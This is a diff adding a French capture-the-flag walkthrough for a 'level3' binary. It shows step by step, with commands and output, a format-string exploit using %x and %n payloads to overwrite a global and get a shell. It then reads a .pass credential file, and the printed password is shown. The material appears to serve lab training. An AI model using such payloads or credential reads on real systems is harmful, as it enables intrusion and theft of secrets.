@@ -135,7 +135,40 @@ On comprend grâce à l'analyse que pour pouvoir avoir notre shell il va falloir
 
 On fait appel à deux fonctions avant la comparaison:
 - fgets(buffer, 512, stdin), qui est protégé d'un buffer overflow puisqu'il ne lira jamais plus de 511 octets
-- printf(buffer), ici par contre le printf est vulnérable à un [exploit de format string](https://www.exploit-db.com/papers/23985) !
-  - on va s'en servir pour écrire 64 dans la globale m et passer le cmp à <+59>
+- printf(buffer), ici par contre le printf est vulnérable à un [exploit de format string](https://cs155.stanford.edu/papers/formatstring-1.2.pdf#page=11)
 
+On cherche le nombre de paramètres a demander pour que printf() commence a prendre ses arguments sur le début de notre format string:
+- `echo 'AAAA%x.%x.%x.%x.%x' | ./level3`
+  ```
+  AAAA200.b7fd1ac0.b7ff37d0.41414141.252e7825
+  ```
+    - On remarque que printf arrive bien sur le début de notre format string (`41414141` => `AAAA`), au quatrième paramètre
+- On peut donc choisir une adresse à afficher: `python -c 'print "\x8c\x98\x04\x08 %4$x"' | ./level3`
+  ```
+  � 804988c
+  ```
+Maintenant qu'on sait comment y accéder, on va se servir du [modifier %n de printf](https://docs.microsoft.com/en-us/cpp/c-runtime-library/format-specification-syntax-printf-and-wprintf-functions?view=msvc-170), qui prend un pointeur sur entier en paramètre (notre adresse) et y écrit le nombre d'octets précédemment affichés par printf.
+- `python -c 'print "\x8c\x98\x04\x08%1$60d%4$n"' | ./level3`
+  - Ici, on affiche l'adresse (4 octets) et le premier paramètre de la stack (0x200) avec un padding de 60 (60 octets)
+  - Puis on dit a printf d'écrire le nombre d'octets écrits précédemment (donc 60 + 4) à l'adresse indiquée par le 4ème argument (qui est le début de notre format string: `0x804988c` en little endian)
+    ```
+    �                                                         512
+    Wait what?!
+    ```
+    - Ca fonctionne, on n'a plus qu'a maintenir le shell ouvert avec cat:
+      - `python -c 'print "\x8c\x98\x04\x08%1$60d%4$n"' > /tmp/exploit`
+      - `cat /tmp/exploit - | ./level3`
+        ```
+        �                                                         512
+        Wait what?!
+
+        ```
+        - `whoami`
+          ```
+          level4
+          ```
+          - `cat /home/user/level4/.pass`
+            ```
+            b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+            ```
 
